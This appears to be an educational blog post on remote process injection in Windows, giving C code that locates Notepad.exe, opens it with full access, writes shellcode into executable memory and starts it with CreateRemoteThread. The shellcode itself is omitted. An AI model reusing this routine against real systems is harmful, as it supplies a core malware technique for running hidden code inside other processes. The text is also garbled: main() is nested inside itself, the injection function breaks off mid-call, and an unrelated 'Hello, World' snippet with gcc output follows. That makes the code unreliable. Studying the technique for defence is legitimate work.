---
layout: post
title:  "Process Injection - 01"
---

## Injecting shellcode into a remote process.

### Introduction

Process injection, a technique utilized in both legitimate applications and malicious software, involves manipulating the memory space of a running process. This blog delves into the intricacies of remote process injection, utilizing a simple C program for educational purposes. It's important to note that the provided code lacks evasion techniques and is intended solely for educational exploration.

### Overview of Process Injection

Process injection serves as a potent method for executing code in the address space of another process. This allows for various functionalities, including code injection, DLL injection, and reflective DLL injection. In our exploration, we'll focus on remote process injection, where the injection process is initiated from an external program. In our example, the program does not incorporate evasion techniques and maintains a straightforward structure. This approach allows for a clearer understanding of the core concepts without introducing complexities related to evasion.

### Utilized functions from the Windows APIs

The success of remote process injection hinges on leveraging specific Win32API functions. These functions play pivotal roles in tasks such as process identification, memory allocation in the remote process, and thread creation. Here are key Win32API functions employed in the provided C code:

- `CreateToolhelp32Snapshot`: Captures a snapshot of all processes currently running in the system.
- `Process32First` and `Process32Next`: Retrieve information about the first and subsequent processes in the snapshot.
- `OpenProcess`: Opens an existing process, providing various access rights.
- `VirtualAllocEx`: Allocates memory in the address space of the specified process.
- `WriteProcessMemory`: Writes data to the memory of the specified process.
- `CreateRemoteThread`: Creates a thread running in the address space of the specified process.

### Flow of the Program (key steps)

1. **Process Identification:** Identify the process ID of "Notepad.exe" or any process ID of your choice using `FindProcessId`.
2. **Open the Process:** If the process ID is obtained, open the process with full access rights using `OpenProcess`.
3. **Payload Injection:** If the process is successfully opened, inject the payload into the target process via the `injectPayload` function.
4. **Execution:** The injected payload, represented by the shellcode, is executed within the context of the target process.

### Understanding the code

1. **Payload definition:** The `payload` variable encapsulates a block of machine code, acting as the payload intended for injection. This payload, in our example, is designed to open a calculator.

    ```c
    unsigned char payload[] = {
      // ... (payload content)
    };
    unsigned int payload_len = sizeof(payload);
    ```

2. **Process Identification:** (Identify the Process ID of "Notepad.exe" using `FindProcessId`)

    In this step, the program uses the `FindProcessId` function to determine the Process ID (PID) of the target process, which, in this example, is "Notepad.exe." The `FindProcessId` function takes the name of the target process as a parameter and iterates through the list of running processes to find a match. Here, the function uses the Windows API functions `CreateToolhelp32Snapshot` and `Process32First/Process32Next` to iterate through the list of processes, comparing each process name with the provided target name ("Notepad.exe"). When a match is found, the corresponding Process ID is returned.

    ```c
    int FindProcessId(const char *FprocessName) {
      HANDLE hProcessSnapshot;
      PROCESSENTRY32 pe32;
      DWORD pid = 0;

      hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

      if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
        // Error handling
        return 0;
      }

      pe32.dwSize = sizeof(PROCESSENTRY32);
      if (!Process32First(hProcessSnapshot, &pe32)) {
        // Error handling
        CloseHandle(hProcessSnapshot);
        return 0;
      }

      while (Process32Next(hProcessSnapshot, &pe32)) {
        if (_stricmp(FprocessName, pe32.szExeFile) == 0) {
          pid = pe32.th32ProcessID;
          break;
        }
      }

      CloseHandle(hProcessSnapshot);
      return pid;
    }
    ```

3. **Open the Process:** (If the Process ID is obtained, open the process with full access rights using `OpenProcess`)

    Once the Process ID is identified, the program uses the `OpenProcess` function to open the target process. This function returns a handle to the specified process, allowing subsequent operations on that process. In this snippet, the `OpenProcess` function is called with the identified Process ID and the desired access rights (`PROCESS_ALL_ACCESS`). If the function succeeds, it returns a handle (`hProcess`) to the opened process, signifying that subsequent operations can be performed on this process.

    ```c
    int main(void) {
      // ... (main function initialization)
      int main(void) {
        int process_Id = 0;
        HANDLE hProcess = NULL;

        process_Id = FindProcessId("Notepad.exe");

        if (process_Id) {
            printf("Notepad process id is: %d", process_Id);

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_Id);
            if (hProcess != NULL) {
                // Code to inject payload
            }
        }

        return 0;
    }
    ```

4. **Remote Process Injection:** If the process is successfully opened, inject the payload into the target process via the `injectPayload` function. Following the successful opening of the target process, the program proceeds to inject the payload. This involves allocating memory within the address space of the target process using `VirtualAllocEx` and writing the payload into that allocated memory with `WriteProcessMemory`. Here, the `injectPayload` function is called with the opened process handle (`hProcess`) and the payload information. The `injectPayload` function, which was defined earlier, handles the memory allocation and payload injection.

    <pre>
    // Function to inject payload into the target process
    int injectPayload(HANDLE ihProcess, unsigned char *iPayload, int iPayload_len) {
        // Allocate memory in the remote process
        LPVOID rmem = VirtualAllocEx(ihProcess, NULL, iPayload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if (rmem == NULL) {
            // Error handling
            return -1;
        }

        // Write the payload into the allocated memory
        if (!WriteProcessMemory(ihProcess, rmem, (PVOID)iPayload, iPayload_len, NULL)) {
            // Error handling
            VirtualFreeEx(ihProcess, rmem, 0, MEM_RELEASE);
            return -1;
        }

        // Create a remote thread to execute the injected payload
        HANDLE cremoteThread = CreateRemoteThread(ihProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rmem, NULL, 0, NULL);

        if (cremoteThread == NULL) {
            // Error handling
            VirtualFreeEx(ihProcess, rmem
            </pre>


        ```c
#include <stdio.h>

int main() {
printf("Hello, World!\n");
return 0;
}
```

<pre>
```bash
$ gcc -o my_program my_program.c
$ ./my_program
Hello, World!
```
</pre>
